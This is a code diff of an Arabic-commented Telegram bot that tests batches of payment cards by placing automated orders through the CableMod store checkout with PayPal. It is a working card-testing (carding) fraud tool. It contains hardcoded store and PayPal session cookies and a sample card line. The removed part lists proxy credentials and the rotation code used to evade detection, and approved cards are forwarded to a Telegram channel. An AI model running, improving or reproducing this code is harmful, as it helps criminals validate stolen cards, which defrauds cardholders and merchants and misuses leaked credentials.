@@ -1,4 +1,9 @@
 # -*- coding: utf-8 -*-
+"""
+CableMod + PayPal PPCP - Telegram Bot
+بوت تليجرام كامل لفحص البطاقات على موقع CableMod
+"""
+
 import os
 import re
 import json
@@ -6,7 +11,6 @@ import time
 import asyncio
 import threading
 import requests
-import random
 from datetime import datetime
 from urllib.parse import urlencode, unquote
 from typing import Optional, Dict, Tuple
@@ -36,10 +40,12 @@ INITIAL_COOKIES = {
     'wordpress_logged_in_ed7813b5c1349c2f14d2f89aad48ec92': 'i0ket57dzb%7C1762918248%7CYdrLmoOaJVRAPuUQxvsIocmsmEmIK9U7Dt36uAg6LjC%7Cf93f09e32eb6e5b1b231f866e4b139366f7f7adaffe4c74d714568d234ada59d',
     '_gcl_au': '1.1.1260044278.1761708631.1187310843.1761708642.1761708669',
     'woocommerce_items_in_cart': '1',
-    'woocommerce_cart_hash': '0c256c5b280165ee7797d5da6cf2949b',
     'wp_woocommerce_session_ed7813b5c1349c2f14d2f89aad48ec92': '114471%7C1762313510%7C1761795110%7C%24generic%24zNpJHnVvxqPTf40fKcg9REZ_f7WuvPUGZk54aXkr',
-    'sbjs_udata': 'vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Safari%2F537.36',
-    '_ga_QYTKZE93WJ': 'GS2.1.s1761733879$o2$g1$t1761734601$j47$l0$h1976509677',
+    'cablemod-express-enabled': 'true',
+    'woocommerce_cart_hash': 'e2dc989a6c4ba1684720b0d512118216',
+    'sbjs_udata': 'vst%3D4%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Safari%2F537.36',
+    '_ga_QYTKZE93WJ': 'GS2.1.s1761748831$o4$g1$t1761748867$j24$l0$h805296536',
+    'sbjs_session': 'pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fstore.cablemod.com%2Fcheckout%2F',
 }
 
 PAYPAL_COOKIES = {
@@ -59,113 +65,6 @@ PAYPAL_COOKIES = {
     'KHcl0EuY7AKSMgfvHl7J5E7hPtK': 'whZ4Q-pT4zAOWrP5smSLQG-PjwjkfC-cCGONV1Xs6zrY3Z4Rn4C4XqDefGl3duxYq80A-5UFoTV78teM',
     'sc_f': 'UkcitVVSun6MogqMKdSPNRHq7u29vzA5Yp02abKnWu0PRTCwph8jJpmSUJDogTGs4H_1gWPJO6jMwQVuXnmhSbj1613ODnFW5ckSiW',
 }
-
-# ====== قائمة البروكسي (100 بروكسي من Webshare) ======
-PROXIES_LIST = [
-    "82.21.224.53:6409:wikniadi:5nhj034pwe2b",
-    "82.29.229.58:6413:wikniadi:5nhj034pwe2b",
-    "82.25.216.252:7094:wikniadi:5nhj034pwe2b",
-    "23.27.184.56:5657:wikniadi:5nhj034pwe2b",
-    "23.27.138.191:6292:wikniadi:5nhj034pwe2b",
-    "82.22.210.10:7852:wikniadi:5nhj034pwe2b",
-    "23.27.184.66:5667:wikniadi:5nhj034pwe2b",
-    "82.21.224.144:6500:wikniadi:5nhj034pwe2b",
-    "23.27.138.3:6104:wikniadi:5nhj034pwe2b",
-    "82.24.224.121:5477:wikniadi:5nhj034pwe2b",
-    "23.27.138.52:6153:wikniadi:5nhj034pwe2b",
-    "23.27.138.7:6108:wikniadi:5nhj034pwe2b",
-    "82.25.216.253:7095:wikniadi:5nhj034pwe2b",
-    "82.29.225.124:5979:wikniadi:5nhj034pwe2b",
-    "82.29.225.234:6089:wikniadi:5nhj034pwe2b",
-    "46.203.159.11:6612:wikniadi:5nhj034pwe2b",
-    "23.27.184.19:5620:wikniadi:5nhj034pwe2b",
-    "82.25.216.58:6900:wikniadi:5nhj034pwe2b",
-    "82.29.229.17:6372:wikniadi:5nhj034pwe2b",
-    "82.29.225.147:6002:wikniadi:5nhj034pwe2b",
-    "82.25.216.82:6924:wikniadi:5nhj034pwe2b",
-    "82.29.225.162:6017:wikniadi:5nhj034pwe2b",
-    "82.22.220.147:5502:wikniadi:5nhj034pwe2b",
-    "82.29.226.49:7391:wikniadi:5nhj034pwe2b",
-    "82.22.217.78:5420:wikniadi:5nhj034pwe2b",
-    "82.29.226.142:7484:wikniadi:5nhj034pwe2b",
-    "23.27.184.34:5635:wikniadi:5nhj034pwe2b",
-    "82.22.210.191:8033:wikniadi:5nhj034pwe2b",
-    "46.203.159.219:6820:wikniadi:5nhj034pwe2b",
-    "82.24.224.176:5532:wikniadi:5nhj034pwe2b",
-    "82.24.224.214:5570:wikniadi:5nhj034pwe2b",
-    "82.29.226.141:7483:wikniadi:5nhj034pwe2b",
-    "23.27.138.141:6242:wikniadi:5nhj034pwe2b",
-    "46.203.159.243:6844:wikniadi:5nhj034pwe2b",
-    "82.29.225.96:5951:wikniadi:5nhj034pwe2b",
-    "23.27.138.4:6105:wikniadi:5nhj034pwe2b",
-    "82.21.224.55:6411:wikniadi:5nhj034pwe2b",
-    "23.27.138.174:6275:wikniadi:5nhj034pwe2b",
-    "82.22.220.98:5453:wikniadi:5nhj034pwe2b",
-    "82.25.216.243:7085:wikniadi:5nhj034pwe2b",
-    "23.27.184.65:5666:wikniadi:5nhj034pwe2b",
-    "82.21.224.157:6513:wikniadi:5nhj034pwe2b",
-    "23.27.184.126:5727:wikniadi:5nhj034pwe2b",
-    "82.22.220.19:5374:wikniadi:5nhj034pwe2b",
-    "66.63.180.86:5610:wikniadi:5nhj034pwe2b",
-    "82.29.225.186:6041:wikniadi:5nhj034pwe2b",
-    "82.27.214.80:6422:wikniadi:5nhj034pwe2b",
-    "82.21.224.4:6360:wikniadi:5nhj034pwe2b",
-    "82.22.210.232:8074:wikniadi:5nhj034pwe2b",
-    "23.27.138.106:6207:wikniadi:5nhj034pwe2b",
-    "82.29.226.36:7378:wikniadi:5nhj034pwe2b",
-    "82.29.226.25:7367:wikniadi:5nhj034pwe2b",
-    "82.29.226.157:7499:wikniadi:5nhj034pwe2b",
-    "82.22.217.47:5389:wikniadi:5nhj034pwe2b",
-    "82.24.224.150:5506:wikniadi:5nhj034pwe2b",
-    "82.27.214.169:6511:wikniadi:5nhj034pwe2b",
-    "82.29.226.160:7502:wikniadi:5nhj034pwe2b",
-    "82.21.224.129:6485:wikniadi:5nhj034pwe2b",
-    "23.27.138.102:6203:wikniadi:5nhj034pwe2b",
-    "82.22.217.21:5363:wikniadi:5nhj034pwe2b",
-    "82.29.225.57:5912:wikniadi:5nhj034pwe2b",
-    "82.22.217.251:5593:wikniadi:5nhj034pwe2b",
-    "82.25.216.216:7058:wikniadi:5nhj034pwe2b",
-    "46.203.159.236:6837:wikniadi:5nhj034pwe2b",
-    "82.22.210.148:7990:wikniadi:5nhj034pwe2b",
-    "82.22.210.117:7959:wikniadi:5nhj034pwe2b",
-    "82.21.224.110:6466:wikniadi:5nhj034pwe2b",
-    "82.22.217.246:5588:wikniadi:5nhj034pwe2b",
-    "23.27.184.248:5849:wikniadi:5nhj034pwe2b",
-    "46.203.159.89:6690:wikniadi:5nhj034pwe2b",
-    "46.203.159.145:6746:wikniadi:5nhj034pwe2b",
-    "82.27.214.125:6467:wikniadi:5nhj034pwe2b",
-    "82.22.220.158:5513:wikniadi:5nhj034pwe2b",
-    "82.22.217.234:5576:wikniadi:5nhj034pwe2b",
-    "82.22.220.208:5563:wikniadi:5nhj034pwe2b",
-    "82.22.210.222:8064:wikniadi:5nhj034pwe2b",
-    "82.25.216.172:7014:wikniadi:5nhj034pwe2b",
-    "82.25.216.37:6879:wikniadi:5nhj034pwe2b",
-    "82.29.225.168:6023:wikniadi:5nhj034pwe2b",
-    "82.24.224.238:5594:wikniadi:5nhj034pwe2b",
-    "82.25.216.201:7043:wikniadi:5nhj034pwe2b",
-    "23.27.138.224:6325:wikniadi:5nhj034pwe2b",
-    "82.21.224.116:6472:wikniadi:5nhj034pwe2b",
-    "82.22.220.43:5398:wikniadi:5nhj034pwe2b",
-    "82.29.225.240:6095:wikniadi:5nhj034pwe2b",
-    "82.21.224.119:6475:wikniadi:5nhj034pwe2b",
-    "82.24.224.202:5558:wikniadi:5nhj034pwe2b",
-    "82.22.210.91:7933:wikniadi:5nhj034pwe2b",
-    "82.22.210.79:7921:wikniadi:5nhj034pwe2b",
-    "82.29.226.220:7562:wikniadi:5nhj034pwe2b",
-    "23.27.184.224:5825:wikniadi:5nhj034pwe2b",
-    "82.21.224.251:6607:wikniadi:5nhj034pwe2b",
-    "82.29.225.230:6085:wikniadi:5nhj034pwe2b",
-    "23.27.184.40:5641:wikniadi:5nhj034pwe2b",
-    "23.27.184.77:5678:wikniadi:5nhj034pwe2b",
-    "82.29.226.113:7455:wikniadi:5nhj034pwe2b",
-    "82.22.217.83:5425:wikniadi:5nhj034pwe2b",
-    "66.63.180.183:5707:wikniadi:5nhj034pwe2b",
-    "82.27.214.77:6419:wikniadi:5nhj034pwe2b",
-    "82.24.224.249:5605:wikniadi:5nhj034pwe2b"
-]
-
-# سيتم اختيار 30 بروكسي عشوائي في بداية كل فحص
-SELECTED_PROXIES = []
 
 # بيانات الفاتورة
 BILLING = {
@@ -259,21 +158,12 @@ def parse_card(card_str: str) -> Tuple[str, str, str, str]:
         raise ValueError(f"الشهر غير صحيح: {month}")
     return number, cvv, year, month
 
-# ====== فئة معالجة الدفع (مع دعم البروكسي) ======
+# ====== فئة معالجة الدفع ======
 class WooCommercePayPal:
-    def __init__(self, proxy=None):
-        self.proxy = proxy
+    def __init__(self):
         self.sess = requests.Session()
-        self.paypal_sess = requests.Session()
-        
-        if self.proxy:
-            parts = self.proxy.split(':')
-            ip, port, user, pwd = parts[0], parts[1], parts[2], parts[3]
-            proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
-            self.sess.proxies = {"http": proxy_url, "https": proxy_url}
-            self.paypal_sess.proxies = {"http": proxy_url, "https": proxy_url}
-        
         self.sess.cookies.update(INITIAL_COOKIES)
+        self.paypal_sess = requests.Session()
         self.paypal_sess.cookies.update(PAYPAL_COOKIES)
         self.nonces = {}
         self.paypal_token = None
@@ -589,15 +479,12 @@ class WooCommercePayPal:
             print(f"[{datetime.now().strftime('%H:%M:%S')}] Liability Shift: POSSIBLE")
         return res
 
-# ====== فحص البطاقة (مع بروكسي عشوائي) ======
+# ====== فحص البطاقة ======
 async def check_card(card: str, bot_app):
     try:
-        proxy = random.choice(SELECTED_PROXIES)
-        print(f"[{datetime.now().strftime('%H:%M:%S')}] Using Proxy: {proxy}")
-
         card_number, cvv, year, month = parse_card(card)
         masked_card = f"{card_number[:6]}******{card_number[-4:]}"
-        processor = WooCommercePayPal(proxy=proxy)
+        processor = WooCommercePayPal()
         processor.step1_get_checkout()
         await asyncio.sleep(0.5)
         processor.step2_update_order_review()
@@ -619,7 +506,7 @@ async def check_card(card: str, bot_app):
         elif status == "PAYER_ACTION_REQUIRED":
             await asyncio.sleep(0.5)
             lookup_result = processor.step6_3ds_verification()
-            status_3ds = lookup_result.get("threeDSStatus")
+            status_3ds = lookup_result.get("threeDSStatus")  # CHALLENGE_REQUIRED, DECLINED, SUCCESS
             liability = lookup_result.get("liability_shift", "NO")
             if status_3ds == "SUCCESS" and liability == "POSSIBLE":
                 stats['approved'] += 1
@@ -678,7 +565,7 @@ async def send_to_channel(bot_app, card, status_type, message):
                 f"`{card}`\n"
                 f"Status: **Approved**\n"
                 f"Card #{card_number}\n"
-                f"Gateway: ** PayPal**\n"
+                f"Gateway: **CableMod + PayPal**\n"
                 f"Mahmoud Saad"
             )
         elif status_type == "3D_SECURE":
@@ -687,7 +574,7 @@ async def send_to_channel(bot_app, card, status_type, message):
                 f"`{card}`\n"
                 f"Status: **{message}**\n"
                 f"Card #{card_number}\n"
-                f"Gateway: ** PayPal**\n"
+                f"Gateway: **CableMod + PayPal**\n"
                 f"Mahmoud Saad"
             )
         else:
@@ -737,7 +624,7 @@ async def update_dashboard(bot_app):
             await bot_app.bot.edit_message_text(
                 chat_id=CHANNEL_ID,
                 message_id=stats['dashboard_message_id'],
-                text="**Card Live PAYPAL CHECKER - LIVE**",
+                text="**CABLEMOD + PAYPAL CHECKER - LIVE**",
                 reply_markup=create_dashboard_keyboard(),
                 parse_mode='Markdown'
             )
@@ -796,7 +683,7 @@ async def process_cards(cards, bot_app):
         stats['cards_checked'] += 1
         if stats['cards_checked'] % 3 == 0:
             await update_dashboard(bot_app)
-        # await asyncio.sleep(2)
+        await asyncio.sleep(2)
     stats['is_running'] = False
     stats['checking'] = 0
     stats['current_card'] = ''
@@ -822,7 +709,7 @@ async def process_cards(cards, bot_app):
         "**تم إنهاء العملية بنجاح!**\n\n"
         "تم إرسال جميع الملفات\n"
         "شكراً لاستخدامك البوت!\n\n"
-        "Gateway: Card Live PayPal\n"
+        "Gateway: CableMod + PayPal\n"
         "Mahmoud Saad"
     )
     await bot_app.bot.send_message(
@@ -838,12 +725,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     keyboard = [[InlineKeyboardButton("إرسال ملف البطاقات", callback_data="send_file")]]
     await update.message.reply_text(
-        "** PAYPAL CARD CHECKER BOT**\n\n"
+        "**CABLEMOD + PAYPAL CARD CHECKER BOT**\n\n"
         "أرسل ملف .txt يحتوي على البطاقات\n"
         "الصيغة: `رقم|شهر|سنة|cvv`\n"
         "مثال: `5224231000447722|12|2030|007`\n\n"
         f"القناة: `{CHANNEL_ID}`\n"
-        "Gateway: **Card Live PayPal **",
+        "Gateway: **CableMod + PayPal PPCP**",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
@@ -855,11 +742,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if stats['is_running']:
         await update.message.reply_text("يوجد فحص جاري!")
         return
-
-    # اختيار 30 بروكسي عشوائي جديد
-    global SELECTED_PROXIES
-    SELECTED_PROXIES = random.sample(PROXIES_LIST, min(30, len(PROXIES_LIST)))
-
     file = await update.message.document.get_file()
     file_content = await file.download_as_bytearray()
     cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]
@@ -883,7 +765,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     })
     dashboard_msg = await context.application.bot.send_message(
         chat_id=CHANNEL_ID,
-        text="** PAYPAL CHECKER - LIVE**",
+        text="**CABLEMOD + PAYPAL CHECKER - LIVE**",
         reply_markup=create_dashboard_keyboard(),
         parse_mode='Markdown'
     )
@@ -891,7 +773,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         f"تم بدء الفحص!\n\n"
         f"إجمالي البطاقات: {len(cards)}\n"
-        f"Gateway: Card Live PayPal\n"
+        f"Gateway: CableMod + PayPal\n"
         f"تابع النتائج في القناة",
         parse_mode='Markdown'
     )
@@ -921,9 +803,8 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ====== Main ======
 def main():
     print("=" * 60)
-    print(" PayPal Telegram Bot")
-    print(" Gateway:PayPal Live")
-    print(" Mahmoud Saad")
+    print("  CableMod + PayPal Telegram Bot")
+    print("  Gateway: CableMod + PayPal PPCP")
     print("=" * 60)
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
